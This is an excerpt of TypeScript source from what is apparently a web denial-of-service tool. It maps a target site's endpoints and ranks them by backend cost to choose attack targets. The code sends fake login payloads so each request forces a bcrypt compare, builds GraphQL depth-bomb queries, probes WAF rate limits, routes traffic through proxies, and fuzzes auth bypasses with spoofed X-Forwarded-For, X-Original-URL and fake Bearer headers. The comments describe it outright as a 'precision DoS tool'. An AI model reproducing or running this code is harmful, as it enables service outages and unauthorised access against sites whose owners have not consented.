    },
    body: (method === "PUT" || method === "PATCH") ? "{}" : undefined,
  });
  if (!r) return null;
  const latencyMs = Date.now() - startedAt;
  // Meaningful = status differs from GET baseline AND isn't 404/405/501.
  // Same status as baseline = middleware enforces the method check; skip.
  // 405 = explicit method-not-allowed; skip (we already classify these).
  // 200/2xx on PUT/PATCH/DELETE = potential IDOR / weak auth vector.
  // OPTIONS with Allow: header containing rare methods = info disclosure.
  if (r.status === 404 || r.status === 405 || r.status === 501) return null;
  if (r.status === baselineStatus) return null;

  let classification: EndpointSample["classification"] = "warm";
  let reason = `${method} ${r.status} (baseline GET=${baselineStatus}) · ${latencyMs}ms`;
  if (r.status >= 200 && r.status < 300) {
    classification = "hot";
    reason = `METHOD-MATRIX ${method} 2xx · ${latencyMs}ms · ${(r.bodyBytes / 1024).toFixed(1)}KB — weak auth on alt method`;
  } else if (r.status === 401 || r.status === 403) {
    if (latencyMs >= 100 && r.bodyBytes >= 200) {
      classification = "hot";
      reason = `METHOD-MATRIX ${method} ${r.status} processed · ${latencyMs}ms`;
    } else {
      classification = "auth";
    }
  } else if (method === "OPTIONS") {
    // OPTIONS is mostly interesting for the Allow: header it returns.
    const allow = r.headers.get("allow");
    if (allow && /PUT|PATCH|DELETE|TRACE/i.test(allow)) {
      classification = "hot";
      reason = `OPTIONS revealed allow: ${allow}`;
    }
  }

  const ct = (r.headers.get("content-type") || "").split(";")[0];
  let path = url;
  try { path = new URL(url).pathname + (new URL(url).search || ""); } catch {/* */}
  return {
    url, path,
    status: r.status,
    latencyMs,
    sizeBytes: r.bodyBytes,
    contentType: ct,
    classification,
    reason,
    method: method as "GET" | "POST",
  };
}

// L5.2 / #66 — Credential probe. The vanilla POST sweep sends `{}` which most
// auth endpoints reject in <50ms without engaging the application's password
// check (validation fails on missing fields). We need to LOOK like a real
// login attempt so the backend actually:
//   - runs JSON parsing,
//   - looks up the email in the user table,
//   - runs bcrypt/argon2 compare against the stored hash,
//   - issues a 401 (because credentials are wrong).
// Each such "rejected login" costs ~100-500ms of pure CPU. Discovering these
// endpoints turns the engine into a precision DoS tool: every attack request
// = one fake-login = one bcrypt compare on the origin.
//
// We try multiple payload shapes since apps differ on field names. The first
// shape that triggers latency > 200ms (indicating real backend work) wins.
const CREDENTIAL_PROBE_PATHS = [
  "/api/auth/callback/credentials",  // Next-auth credentials provider
  "/api/auth/signin",
  "/api/auth/signin/credentials",
  "/api/login",
  "/api/v1/login",
  "/api/v1/auth/login",
  "/api/users/login",
  "/api/sessions",                    // some apps use REST-style /sessions for login
  "/login",                           // form-handler routes
  "/signin",
];

const CREDENTIAL_PAYLOADS: Array<{ body: string; contentType: string; label: string }> = [
  // Next-auth credentials provider — form-encoded shape
  {
    body: "email=probe-test@example.com&password=InvalidPass123!&csrfToken=probe&callbackUrl=/&json=true",
    contentType: "application/x-www-form-urlencoded",
    label: "next-auth-form",
  },
  // Standard JSON login
  {
    body: JSON.stringify({ email: "probe-test@example.com", password: "InvalidPass123!" }),
    contentType: "application/json",
    label: "json-email",
  },
  // Username-style login (older apps)
  {
    body: JSON.stringify({ username: "probetest", password: "InvalidPass123!" }),
    contentType: "application/json",
    label: "json-username",
  },
];

async function credentialProbeOne(url: string): Promise<EndpointSample | null> {
  // Try each payload shape; keep the one with the highest latency (= deepest
  // backend processing). Cap at 3 shapes × 3s = 9s worst case per endpoint.
  let best: EndpointSample | null = null;
  for (const payload of CREDENTIAL_PAYLOADS) {
    const s = await postProbeOne(url, 3_500, payload.body, payload.contentType);
    if (!s) continue;
    // Re-classify with credential-aware rules: even 401 is HOT if latency is
    // >200ms because that latency comes from bcrypt + DB lookup running.
    if (s.status === 401 || s.status === 403 || s.status === 422 ||
        (s.status >= 200 && s.status < 300)) {
      const isCpuExpensive = s.latencyMs >= 200;
      if (isCpuExpensive) {
        s.classification = "hot";
        s.reason = `CRED ${s.status} (${payload.label}) · ${s.latencyMs}ms · ${(s.sizeBytes / 1024).toFixed(1)}KB — bcrypt+DB triggered`;
      }
    }
    if (!best || s.latencyMs > best.latencyMs) best = s;
  }
  return best;
}

// L5.3 / #67 — Bypass-fuzzing on AUTH endpoints. Many middlewares trust
// header inputs they shouldn't: X-Forwarded-For: 127.0.0.1 makes them think
// the request is local; X-Original-URL routes through a different handler
// in Express/Spring; Authorization: Bearer <anything> sometimes bypasses
// session-based middleware that only checks for *presence* of the header.
// Accept: application/json flips many SSR redirects into JSON 401s, which
// is a different code path and can leak info.
//
// For each AUTH-classed endpoint we fire 5 variants. If ANY variant yields a
// different status (especially 2xx) or significantly more body data, we
// promote the URL to HOT-BYPASS and remember which header trick worked.
const BYPASS_HEADER_VARIANTS: Array<{ label: string; headers: Record<string, string> }> = [
  {
    label: "accept-json",
    headers: { "Accept": "application/json" },
  },
  {
    label: "xff-localhost",
    headers: { "X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1" },
  },
  {
    label: "x-original-url",
    headers: { "X-Original-URL": "/admin", "X-Rewrite-URL": "/admin" },
  },
  {
    label: "fake-bearer",
    headers: { "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0In0.fake" },
  },
  {
    label: "self-origin",
    headers: { "Origin": "https://localhost", "Referer": "https://localhost/" },
  },
];

async function bypassProbeOne(
  s: EndpointSample,
): Promise<{ winning: string; sample: EndpointSample } | null> {
  // Baseline status from the original probe — anything noticeably different
  // is suspicious. We accept 2xx (full bypass), or 401→200 transitions, or
  // a body-size jump indicating different handler.
  const baseStatus = s.status;
  const baseBytes = s.sizeBytes;
  for (const variant of BYPASS_HEADER_VARIANTS) {
    const startedAt = Date.now();
    const r = await probeFetch(s.url, {
      method: s.method === "POST" ? "POST" : "GET",
      timeoutMs: 2_000,
      bodyCapBytes: 16_000,
      followRedirects: false,
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": "text/html,application/json,*/*;q=0.8",
        ...variant.headers,
      },
      body: s.method === "POST" ? "{}" : undefined,
    });
    if (!r) continue;
    const latencyMs = Date.now() - startedAt;
    const isBypass = (r.status >= 200 && r.status < 300 && baseStatus >= 400) ||
                     (r.bodyBytes > baseBytes * 3 && r.bodyBytes > 500);
    if (isBypass) {
      const ct = (r.headers.get("content-type") || "").split(";")[0];
      return {
        winning: variant.label,
        sample: {
          url: s.url, path: s.path,
          status: r.status,
          latencyMs,
          sizeBytes: r.bodyBytes,
          contentType: ct,
          classification: "hot",
          reason: `BYPASS via ${variant.label} · ${baseStatus} → ${r.status} · ${(r.bodyBytes / 1024).toFixed(1)}KB`,
          method: s.method || "GET",
        },
      };
    }
  }
  return null;
}

// L4: Next.js buildId discovery. Every Next.js page embeds the buildId in
// __NEXT_DATA__ JSON or references it via _buildManifest.js URL. Knowing the
// buildId unlocks /_next/data/{buildId}/{page}.json endpoints — these are
// the raw getServerSideProps JSON responses, almost always public, often
// hitting the DB, perfect attack targets.
function extractNextJsBuildId(html: string): string | null {
  const m1 = html.match(/"buildId"\s*:\s*"([^"]+)"/);
  if (m1) return m1[1];
  const m2 = html.match(/\/_next\/static\/([A-Za-z0-9_\-]+)\/_buildManifest\.js/);
  if (m2) return m2[1];
  return null;
}

function generateNextDataProbes(buildId: string, origin: string, extraPages: string[]): string[] {
  const slugs = new Set<string>([
    "index", "login", "signin", "register", "about", "contact",
    "forum", "posts", "users", "search", "feed",
  ]);
  for (const p of extraPages) {
    let s = p.replace(/^\/+/, "").replace(/\.html?$/, "");
    s = s.split("?")[0].split("#")[0];
    if (s) slugs.add(s);
  }
  return Array.from(slugs).map((s) => `${origin}/_next/data/${buildId}/${s}.json`);
}

// L4: JS bundle scraping. Modern SPAs (Next.js, Nuxt, plain React) embed
// every API endpoint they touch in their JS bundles as string constants.
// Pull the first 5 <script src> URLs and grep the bundles for paths that
// look like API routes. Yields 10-50x more endpoints than __NEXT_DATA__
// alone for any non-trivial app.
async function collectJsBundleUrls(html: string, origin: string, sameHost: string): Promise<string[]> {
  const out = new Set<string>();
  const re = /<script[^>]+src=["']([^"']+\.js[^"']*)["']/gi;
  let m: RegExpExecArray | null;
  while ((m = re.exec(html)) !== null) {
    try {
      const abs = m[1].startsWith("http") ? m[1] : new URL(m[1], origin).toString();
      const u = new URL(abs);
      if (u.hostname.toLowerCase() === sameHost) out.add(abs);
    } catch {/* */}
    if (out.size > 12) break;
  }
  return Array.from(out);
}

async function scrapeBundlesForEndpoints(
  jsUrls: string[],
  origin: string,
  sameHost: string,
): Promise<string[]> {
  const found = new Set<string>();
  // Look for inline strings that look like API/route paths. The regex
  // requires a leading / + one of the common "API" path heads to avoid
  // matching e.g. "/static/img.png". The path body is ≥2 chars and limited
  // to URL-safe glyphs so we don't grab random JS object members.
  const re = /["'`](\/(?:api|graphql|trpc|v[0-9]+|auth|admin|user[s]?|account|public|rest|rpc)\/[A-Za-z0-9_\-./{}]{2,})["'`]/g;
  // Process bundles serially with a small per-bundle cap so a single huge
  // chunk doesn't blow memory.
  for (const jsUrl of jsUrls.slice(0, 5)) {
    try {
      const c = new AbortController();
      const t = setTimeout(() => c.abort(), 6_000);
      const r = await fetch(jsUrl, {
        method: "GET",
        signal: c.signal,
        headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36" },
      });
      clearTimeout(t);
      if (!r.ok) continue;
      const reader = r.body?.getReader();
      if (!reader) continue;
      const chunks: Uint8Array[] = [];
      let total = 0;
      for (let i = 0; i < 512; i++) {
        const { done, value } = await reader.read();
        if (done) break;
        if (value) {
          chunks.push(value);
          total += value.byteLength;
          if (total > 2_000_000) { try { await reader.cancel(); } catch {/* */} break; }
        }
      }
      const body = Buffer.concat(chunks.map((c) => Buffer.from(c))).toString("utf8");
      let mm: RegExpExecArray | null;
      while ((mm = re.exec(body)) !== null) {
        try {
          const abs = new URL(mm[1], origin).toString();
          const u = new URL(abs);
          if (u.hostname.toLowerCase() === sameHost) found.add(abs);
        } catch {/* */}
        if (found.size > 120) break;
      }
      re.lastIndex = 0;
    } catch {/* skip on any bundle fail */}
  }
  return Array.from(found);
}

// L6.5 / #72 — GraphQL depth-bomb generator. When introspection-open
// GraphQL is detected, we hand the brain a deeply nested query as the
// attack body. Each request exponentially branches the resolver tree, so
// even one GraphQL server processing 50 RPS of these takes seconds per
// query → CPU/RAM exhausted fast. The query uses generic field names
// (id/name/edges/node/users/posts/comments) that almost every schema
// implements. If the server rejects unknown fields it STILL parses the
// whole AST first, so the parsing cost is paid.
function generateGraphQLDepthBomb(depth: number = 8): string {
  let inner = "id name __typename";
  for (let i = 0; i < depth; i++) {
    inner = `posts(first:50){edges{node{${inner}}}} comments(first:50){edges{node{${inner}}}}`;
  }
  const query = `query{users(first:50){edges{node{${inner}}}}}`;
  return JSON.stringify({ query });
}

// L4: GraphQL introspection probe. If the server exposes /graphql with
// introspection enabled, we get the entire API schema in one POST. Major
// finding for any modern stack. We try 4 common paths; on the first hit
// that returns __schema content we stop and tag the URL HOT.
async function detectGraphQL(origin: string): Promise<EndpointSample | null> {
  const paths = ["/graphql", "/api/graphql", "/v1/graphql", "/query"];
  const body = JSON.stringify({ query: "{__schema{queryType{name}}}" });
  for (const p of paths) {
    const url = `${origin}${p}`;
    const c = new AbortController();
    const t = setTimeout(() => c.abort(), 3_500);
    const startedAt = Date.now();
    try {
      const r = await fetch(url, {
        method: "POST",
        signal: c.signal,
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
          "Accept": "application/json",
          "Content-Type": "application/json",
        },
        body,
        redirect: "manual",
      });
      const latencyMs = Date.now() - startedAt;
      if (!r.ok) { clearTimeout(t); continue; }
      const text = await r.text();
      clearTimeout(t);
      if (text.includes("__schema") || (text.includes("queryType") && text.includes("name"))) {
        // L6.5 — Pre-bake a depth-bomb query as the attack payload. Any
        // server that accepts introspection has no query-complexity limit
        // either; this body forces the resolver tree to fan out 2^8 = 256
        // leaf evaluations per request.
        const bombBody = generateGraphQLDepthBomb(8);
        return {
          url, path: p,
          status: r.status,
          latencyMs,
          sizeBytes: text.length,
          contentType: r.headers.get("content-type") || "application/json",
          classification: "hot",
          reason: `🚨 GraphQL introspection OPEN · depth-bomb auto-armed · ${latencyMs}ms · ${(text.length / 1024).toFixed(1)}KB schema`,
          method: "POST",
          attackBody: bombBody,
          attackContentType: "application/json",
        };
      }
    } catch { clearTimeout(t); }
  }
  return null;
}

// L3: WAF rate-limit probe. Fire `count` short-spaced requests at a single
// endpoint and measure how many came back 429/403 (WAF reject) vs 2xx/3xx
// (passes). Wraps `fetchOne` for GET endpoints and `postProbeOne` for POST
// ones to match how the engine would actually attack the URL.
//
// Output: 0.0 = no rate-limit, attack flat-out; 1.0 = every request blocked,
// don't bother. Brain multiplies endpoint weight by (1 - ratio) so heavily-
// blocked endpoints get demoted to the bottom of the rotation.
async function wafProbe(
  s: EndpointSample,
  count: number = 12,
  intervalMs: number = 100,
): Promise<number> {
  const isPost = s.method === "POST";
  let limited = 0;
  let total = 0;
  for (let i = 0; i < count; i++) {
    const sample = isPost
      ? await postProbeOne(s.url, 3_500)
      : await fetchOne(s.url, 3_500);
    if (!sample) continue;
    total++;
    if (sample.status === 429 || sample.status === 403) limited++;
    if (i < count - 1) await new Promise((r) => setTimeout(r, intervalMs));
  }
  if (total === 0) return 0;
  return limited / total;
}

// L3: anon-vs-auth diff. Re-probe a single URL with the operator's cookie
// attached and return the byte delta between the two response sizes. Positive
// delta means the auth version is fatter — typically because the server ran
// extra DB queries (user profile, permissions, personalized feed). These are
// the spiciest attack targets when the operator has a working session.
async function authDiffOne(
  url: string,
  cookie: string,
  method: "GET" | "POST",
  anonSize: number,
): Promise<number | null> {
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), 4_000);
  try {
    const r = await fetch(url, {
      method,
      signal: c.signal,
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": method === "POST" ? "application/json,*/*;q=0.8" : "text/html,application/json,*/*;q=0.8",
        "Cookie": cookie,
        ...(method === "POST" ? { "Content-Type": "application/json" } : {}),
      },
      body: method === "POST" ? "{}" : undefined,
      redirect: "manual",
    });
    let authSize = 0;
    try {
      const reader = r.body?.getReader();
      if (reader) {
        for (let i = 0; i < 32; i++) {
          const { done, value } = await reader.read();
          if (done) break;
          authSize += value?.byteLength ?? 0;
          if (authSize > 64_000) { try { await reader.cancel(); } catch {/* */} break; }
        }
      }
    } catch {/* */}
    return authSize - anonSize;
  } catch {
    return null;
  } finally {
    clearTimeout(t);
  }
}

// L3: final ranking weight. Higher = better attack target. Multiplies base
// latency by a stack of multipliers that bias the rotation toward expensive
// backend work and away from edge-cached / WAF-throttled URLs.
function computeWeight(s: EndpointSample): number {
  let w = Math.max(50, s.latencyMs || 100); // floor so 0ms cache hits don't zero-out
  if (s.wafLimitedRatio !== undefined) w *= Math.max(0.1, 1 - s.wafLimitedRatio);
  if (s.authSizeDelta !== undefined && s.authSizeDelta > 0) w *= 1 + s.authSizeDelta / 1000;
  if (s.method === "POST") w *= 1.5;
  const ct = (s.contentType || "").toLowerCase();
  if (ct.includes("json")) w *= 2.0;
  const cs = (s.cacheStatus || "").toLowerCase();
  if (cs.includes("hit") || cs.includes("stale")) w *= 0.5;
  return w;
}

async function sweepEndpoints(
  origin: string,
  sameHost: string,
  mainHtml: string | null,
  cookie?: string,
  stack?: string,
): Promise<{ samples: EndpointSample[]; vulns: VulnFinding[] }> {
  const candidates = new Set<string>();
  for (const p of COMMON_PROBE_PATHS) candidates.add(`${origin}${p}`);
  if (mainHtml) {
    for (const u of extractSameOriginLinks(mainHtml, sameHost, origin)) candidates.add(u);
    for (const u of extractNextJsApiRoutes(mainHtml, origin)) candidates.add(u);
  }

  // ─── L4 deep recon — pre-pass URL building ────────────────────
  // Add stack-aware wordlist + Next.js buildId-based probes + JS bundle
  // scrape results to the candidate set BEFORE the GET pass runs, so all
  // discovered endpoints flow through the same GET → POST → enrichment
  // pipeline. Order: generic wordlist (universal) → stack-specific words.
  for (const p of L4_GENERIC_WORDLIST) candidates.add(`${origin}${p}`);
  if (stack === "vercel" || stack === "nextjs") {
    for (const p of L4_VERCEL_NEXTJS_WORDLIST) candidates.add(`${origin}${p}`);
  }
  if (stack === "cloudflare") {
    for (const p of L4_CLOUDFLARE_WORDLIST) candidates.add(`${origin}${p}`);
  }
  // WordPress is detected via /wp-login.php fingerprint inside generic wordlist,
  // but we add the wordlist eagerly when the main response looks WP-ish.
  if (mainHtml && /wp-content|wp-includes|wordpress/i.test(mainHtml)) {
    for (const p of L4_WORDPRESS_WORDLIST) candidates.add(`${origin}${p}`);
  }
  if (mainHtml) {
    // buildId-based Next.js data probes — extract buildId from the HTML and
    // construct probable getServerSideProps endpoints. These are JSON, often
    // hit DB, and rarely cached at edge → ideal HOT targets.
    const buildId = extractNextJsBuildId(mainHtml);
    if (buildId) {
      const linkedPaths: string[] = [];
      try {
        for (const u of extractSameOriginLinks(mainHtml, sameHost, origin)) {
          const p = new URL(u).pathname;
          if (p && p !== "/" && p.length < 80) linkedPaths.push(p);
        }
      } catch {/* */}
      for (const u of generateNextDataProbes(buildId, origin, linkedPaths.slice(0, 15))) {
        candidates.add(u);
      }
    }
    // JS bundle scraping — pull endpoints out of compiled SPA code. This is
    // where the bulk of "hidden" API routes live in modern apps.
    try {
      const jsUrls = await collectJsBundleUrls(mainHtml, origin, sameHost);
      const scraped = await scrapeBundlesForEndpoints(jsUrls, origin, sameHost);
      for (const u of scraped) candidates.add(u);
    } catch {/* JS scrape is best-effort */}
  }

  const list = Array.from(candidates).slice(0, 120); // cap to keep sweep under 20s

  // Concurrency-limited fan-out — Promise.all on 80 fetches would burst the
  // origin and look like an attack instead of a probe.
  const concurrency = 12;
  const getResults: EndpointSample[] = [];
  for (let i = 0; i < list.length; i += concurrency) {
    const batch = list.slice(i, i + concurrency);
    const samples = await Promise.all(batch.map((u) => fetchOne(u, 2_500)));
    for (const s of samples) if (s) {
      s.method = "GET";
      getResults.push(s);
    }
  }

  // #59 POST-pass — for every GET 405 ("wrong method") + a curated list of
  // POST-only Next-auth/form routes, re-probe with POST + empty JSON body.
  // If the server returns 2xx/400/422 the endpoint is alive on POST and is
  // almost certainly more expensive than GET (DB writes / token issuance /
  // body validation chain). We tag method="POST" so the brain can later
  // auto-switch the engine into POST mode and filter the rotation.
  const postCandidates = new Set<string>();
  for (const p of POST_ONLY_PROBE_PATHS) postCandidates.add(`${origin}${p}`);
  for (const s of getResults) {
    if (s.status === 405) postCandidates.add(s.url);
  }
  const postList = Array.from(postCandidates).slice(0, 20);

  const postResults: EndpointSample[] = [];
  for (let i = 0; i < postList.length; i += concurrency) {
    const batch = postList.slice(i, i + concurrency);
    const samples = await Promise.all(batch.map((u) => postProbeOne(u, 2_500)));
    for (const s of samples) {
      if (!s) continue;
      // We only keep a POST sample if it's a real signal — HOT or AUTH.
      // POST 404/405 is just noise (same as DEAD on GET) and would clutter
      // the rotation if mixed in.
      if (s.classification === "hot" || s.classification === "auth") {
        postResults.push(s);
      }
    }
  }

  // Merge — if a URL exists in both GET and POST results AND POST classified
  // it as HOT, POST wins (better attack vector). Otherwise GET stays.
  const byUrl = new Map<string, EndpointSample>();
  for (const s of getResults) byUrl.set(s.url, s);
  for (const s of postResults) {
    const existing = byUrl.get(s.url);
    if (!existing || existing.classification !== "hot") {
      byUrl.set(s.url, s);
    } else if (s.classification === "hot" && existing.method === "GET") {
      byUrl.set(s.url + "#POST", s);
    }
  }

  // #66 / L5.2 — Credential probe pass on login-style endpoints. Triggers
  // real bcrypt/DB work per request when successful (latency >200ms with
  // 401/422). Each credential probe sends 3 payload shapes serially through
  // the proxy pool; first one to elicit deep latency wins. The result is
  // merged into the main map under a "#CRED" key so it doesn't displace
  // the GET/POST entries — they're all viable rotation candidates.
  const credCandidates = new Set<string>();
  for (const p of CREDENTIAL_PROBE_PATHS) credCandidates.add(`${origin}${p}`);
  // Also retry credential probe on POST-sweep HOT entries that look auth-ish.
  for (const s of postResults) {
    if (/login|signin|auth|session|credential/i.test(s.path) && s.classification === "hot") {
      credCandidates.add(s.url);
    }
  }
  const credList = Array.from(credCandidates).slice(0, 6);
  await Promise.all(credList.map(async (u) => {
    const s = await credentialProbeOne(u);
    if (s && s.classification === "hot") {
      // Suffix the key so credential-probe results coexist with the basic POST
      // sweep results — both are valid attack vectors but the credential one
      // is more accurate per-request cost.
      byUrl.set(u + "#CRED", s);
    }
  }));

  // #69 / L6.2 — HTTP method matrix on top candidates by GET latency. We
  // only probe entries that returned something (not transport errors); that
  // means the path actually exists at the origin. Caps at 25 candidates ×
  // 5 alt methods = 125 extra requests (proxy-routed so blast is spread).
  const matrixCandidates = getResults
    .filter((s) => s.status > 0 && s.status !== 404)
    .sort((a, b) => b.latencyMs - a.latencyMs)
    .slice(0, 8);
  const matrixMethods: ("PUT" | "PATCH" | "DELETE" | "HEAD" | "OPTIONS")[] =
    ["OPTIONS", "PUT", "PATCH", "DELETE", "HEAD"];
  const matrixResults: EndpointSample[] = [];
  for (let i = 0; i < matrixCandidates.length; i += 4) {
    const batch = matrixCandidates.slice(i, i + 4);
    const tasks: Promise<EndpointSample | null>[] = [];
    for (const s of batch) {
      for (const m of matrixMethods) tasks.push(methodMatrixOne(s.url, m, s.status));
    }
    const results = await Promise.all(tasks);
    for (const r of results) if (r) matrixResults.push(r);
  }
  // Merge matrix results — keyed with method suffix to coexist with GET entries.
  for (const s of matrixResults) {
    byUrl.set(s.url + "#" + (s.method || "M"), s);
  }

  // #67 / L5.3 — Bypass-fuzzing on AUTH-classified entries. For each AUTH
  // endpoint, fire 5 header-trick variants in parallel; first variant that
  // bypasses gets the URL promoted to HOT-BYPASS. Capped at top-25 AUTH
  // entries by latency so we don't bombard the origin with low-priority
  // probes — endpoints that took longer to reject are more likely to have
  // application logic worth bypassing.
  const authEntries = Array.from(byUrl.values())
    .filter((s) => s.classification === "auth")
    .sort((a, b) => b.latencyMs - a.latencyMs)
    .slice(0, 5);
  const bypassResults = await Promise.all(
    authEntries.map((s) => bypassProbeOne(s).catch(() => null)),
  );
  for (let i = 0; i < bypassResults.length; i++) {
    const r = bypassResults[i];
    if (r) byUrl.set(authEntries[i].url + "#BYPASS", r.sample);
  }

  // #71 L6.4 — Recursive URL discovery (1-level). Take HTML-200 entries from
  // the first sweep pass, re-fetch their bodies, extract same-origin links,
  // and run a follow-up GET pass on URLs we haven't seen yet. Sweep becomes
  // self-extending: pages reference pages, and we discover what wasn't on
  // any wordlist or in the main HTML. Capped to top-5 html-200 seeds × 30
  // newly-discovered URLs to keep the blast radius small.
  const htmlSeeds = Array.from(byUrl.values())
    .filter((s) =>
      s.status >= 200 && s.status < 300 &&
      /html/i.test(s.contentType) &&
      s.path !== "/" // already scraped in main pass
    )
    .sort((a, b) => b.sizeBytes - a.sizeBytes)
    .slice(0, 3);
  const recursiveCandidates = new Set<string>();
  for (const seed of htmlSeeds) {
    try {
      const r = await probeFetch(seed.url, {
        method: "GET",
        timeoutMs: 2_500,
        bodyCapBytes: 256_000,
        followRedirects: false,
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        },
      });
      if (!r || !r.bodyText) continue;
      for (const u of extractSameOriginLinks(r.bodyText, sameHost, origin)) {
        if (!byUrl.has(u)) recursiveCandidates.add(u);
      }
      for (const u of extractNextJsApiRoutes(r.bodyText, origin)) {
        if (!byUrl.has(u)) recursiveCandidates.add(u);
      }
    } catch {/* skip */}
    if (recursiveCandidates.size > 15) break;
  }
  const recList = Array.from(recursiveCandidates).slice(0, 15);
  if (recList.length > 0) {
    for (let i = 0; i < recList.length; i += concurrency) {
      const batch = recList.slice(i, i + concurrency);
      const samples = await Promise.all(batch.map((u) => fetchOne(u, 2_500)));
      for (const s of samples) {
        if (!s) continue;
        s.method = "GET";
        byUrl.set(s.url, s);
      }
    }
  }

  // L8 BRAIN #1 — OpenAPI / Swagger spec auto-parse.
  //
  // The hardcoded wordlist already probes /swagger.json, /openapi.json,
  // /api-docs etc., but historically we only classified them as HOT/AUTH —
  // we never opened the body. If any of those return JSON, parsing the
  // `paths` object unlocks every documented endpoint at once. Going from
  // "1 endpoint" to "200+ documented attack surfaces" with a single parse.
  //
  // Heuristic detection: a candidate is an OpenAPI/Swagger spec when its
  // path matches a known spec route OR the response body starts with
  // `{"openapi":"3` / `{"swagger":"2` / contains `"paths":{`. We re-fetch
  // with body capture (the initial sweep didn't store body to save memory)
  // and parse with a defensive try/catch — malformed JSON is treated as
  // "not a spec, move on".
  const SPEC_PATH_RE = /(swagger|openapi|api-docs|api[/.-]spec|api[/.-]schema)/i;
  const specCandidates = Array.from(byUrl.values()).filter((s) =>
    s.status >= 200 && s.status < 300 &&
    /json|yaml/i.test(s.contentType) &&
    SPEC_PATH_RE.test(s.path)
  );
  for (const cand of specCandidates.slice(0, 5)) {
    try {
      const r = await probeFetch(cand.url, {
        method: "GET",
        timeoutMs: 5_000,
        bodyCapBytes: 1_500_000,  // OpenAPI specs can be huge
        followRedirects: false,
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
          "Accept": "application/json,application/yaml,*/*;q=0.8",
        },
      });
      if (!r || !r.bodyText) continue;
      const text = r.bodyText.trim();
      // Quick smell test before parsing — large spec files can OOM if we
      // try to JSON.parse non-JSON content.
      if (!text.startsWith("{") && !text.startsWith("[")) continue;
      const spec = JSON.parse(text);
      if (typeof spec !== "object" || spec === null) continue;
      const paths = (spec as Record<string, unknown>).paths;
      if (typeof paths !== "object" || paths === null) continue;
      const basePath = typeof (spec as Record<string, unknown>).basePath === "string"
        ? (spec as Record<string, string>).basePath
        : "";
      // OpenAPI 3: spec.servers[0].url is the base — usually relative to origin
      // already, but we extract a relative prefix if present.
      let serverPrefix = basePath;
      const servers = (spec as Record<string, unknown>).servers;
      if (Array.isArray(servers) && servers.length > 0) {
        const s0 = servers[0];
        if (typeof s0 === "object" && s0 !== null) {
          const url = (s0 as Record<string, unknown>).url;
          if (typeof url === "string") {
            try {
              const u = new URL(url, origin);
              if (u.origin === origin) serverPrefix = u.pathname.replace(/\/$/, "");
            } catch {/* relative or malformed → ignore */}
          }
        }
      }
      let added = 0;
      for (const [rawPath, methods] of Object.entries(paths)) {
        if (typeof rawPath !== "string" || !rawPath.startsWith("/")) continue;
        // Skip path parameter placeholders we can't usefully attack
        // (e.g. /users/{id} — we'd need a real id, otherwise 404). Keep
        // them only if they have a query/static neighbor we can hit.
        const hasPlaceholder = /\{[^}]+\}/.test(rawPath);
        if (hasPlaceholder) {
          // Substitute placeholders with `1` — many endpoints accept this
          // and exercise the same DB lookup path as a real id.
          const concrete = rawPath.replace(/\{[^}]+\}/g, "1");
          const url = `${origin}${serverPrefix}${concrete}`;
          if (!byUrl.has(url)) {
            const opMethods = (typeof methods === "object" && methods !== null)
              ? Object.keys(methods as Record<string, unknown>).filter((k) =>
                  ["get", "post", "put", "patch", "delete"].includes(k.toLowerCase())
                )
              : [];
            // Use GET for these substituted paths — most app routers will
            // 404 the placeholder if it's invalid for GET, which is fine.
            const method = (opMethods[0] || "GET").toUpperCase() as EndpointSample["method"];
            byUrl.set(url, {
              url,
              path: `${serverPrefix}${concrete}`,
              status: 0,            // placeholder; will be filled by re-probe
              latencyMs: 0,
              sizeBytes: 0,
              contentType: "openapi",
              classification: "hot",
              reason: `📚 OpenAPI ${rawPath} (placeholder→1)`,
              method,
              weight: 5000,         // boost — documented endpoints are gold
            });
            added++;
            if (added > 60) break;
          }
        } else {
          const url = `${origin}${serverPrefix}${rawPath}`;
          if (!byUrl.has(url)) {
            byUrl.set(url, {
              url,
              path: `${serverPrefix}${rawPath}`,
              status: 0,
              latencyMs: 0,
              sizeBytes: 0,
              contentType: "openapi",
              classification: "hot",
              reason: `📚 OpenAPI ${rawPath}`,
              method: "GET",
              weight: 5000,
            });
            added++;
            if (added > 60) break;
          }
        }
      }
      if (added > 0) {
        // Re-probe new entries so their classification, status, latency are
        // honest (not placeholder zeros). Cheap because we already have them
        // batched.
        const newUrls = Array.from(byUrl.values())
          .filter((s) => s.contentType === "openapi" && s.status === 0)
          .map((s) => s.url)
          .slice(0, 30);
        for (let i = 0; i < newUrls.length; i += concurrency) {
          const batch = newUrls.slice(i, i + concurrency);
          const samples = await Promise.all(batch.map((u) => fetchOne(u, 2_500)));
          for (const s of samples) if (s) {
            const prev = byUrl.get(s.url);
            // Keep the OpenAPI reason so the UI flags this entry as a
            // documented endpoint even when classification changes.
            s.method = s.method || "GET";
            if (prev && prev.reason.startsWith("📚")) {
              s.reason = `${prev.reason} · ${s.reason}`;
              s.weight = Math.max(s.weight || 0, prev.weight || 0);
            }
            byUrl.set(s.url, s);
          }
        }
      }
    } catch {
      // JSON parse fail or fetch fail — silent skip, spec wasn't useful.
    }
  }

  const merged = Array.from(byUrl.values());

  // ─── L3 ENRICHMENT ──────────────────────────────────────────────
  // For the top-N HOT endpoints by raw latency, run two extra probes:
